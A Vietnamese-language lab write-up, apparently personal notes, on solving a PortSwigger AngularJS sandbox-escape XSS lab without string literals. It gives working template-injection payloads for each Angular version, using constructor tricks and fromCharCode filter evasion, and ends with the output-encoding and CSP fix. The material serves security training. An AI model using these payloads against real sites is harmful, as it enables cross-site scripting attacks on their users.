![[xss-angular.png]]
-mô tả lab: search term reflect vào AngularJS (ng-template) có sandbox. Mình escape sandbox để chạy alert mà không dùng string thường.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-sandbox-escape-without-strings (biến thể without strings / with event)
> -test ở ô search trang blog

### hướng giải
- [ ] mình nhập `{{7*7}}` vào search, sau đó quan sát gói tin trả về, mình thấy nó render ra `49` -> dính AngularJS template injection / XSS
- [ ] mình thử `{{alert(1)}}` thì bị sandbox chặn (Angular 1.x sandbox cấm truy cập Function/constructor trực tiếp)
- [ ] => mình phải đi đường vòng: dùng `toString()` + `constructor` để lách, và né filter cấm string bằng `String.fromCharCode` hoặc regex `/. /`... Mình nhớ công thức kinh điển rồi ráp vào

### giải
-bước 1: confirm Angular version trong JS bundle (vd angular-1.6.x). Sandbox mỗi version bypass khác nhau, mình chọn payload đúng version.

-bước 2: payload escape kinh điển của mình (Angular 1.6, không dùng string quote):
```
{{a=''.constructor.prototype;a.charAt=[].join;$eval('x=alert(1)')}}
```
-bản without-strings mình hay dùng:
```
{{$on.constructor('alert(1)')()}}
```
![[xss-angular-payload.png]]
-mình nhập vào search, response render template thực thi -> alert(1) hiện là solve. Nếu lab chặn `alert` chữ thường thì mình dùng `String.fromCharCode(97,108,101,114,116,40,49,41)` ráp lại.

-bước 3: nếu 1 payload fail, mình thử chuỗi bypass theo version:
- 1.5.x: `{{x={'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`
- 1.6.x: `{{$on.constructor('alert(1)')()}}`
- mới hơn: sandbox bỏ rồi, `{{constructor.constructor('alert(1)')()}}` thẳng.

> [!NOTE]
> -bài học của mình: thấy `{{...}}` render là nghĩ ngay template injection. Sandbox client-side chỉ làm chậm attacker, fix chuẩn là encode output + CSP.
> -mẹo của mình: luôn check version Angular trong bundle trước, mỗi version 1 payload khác nhau.
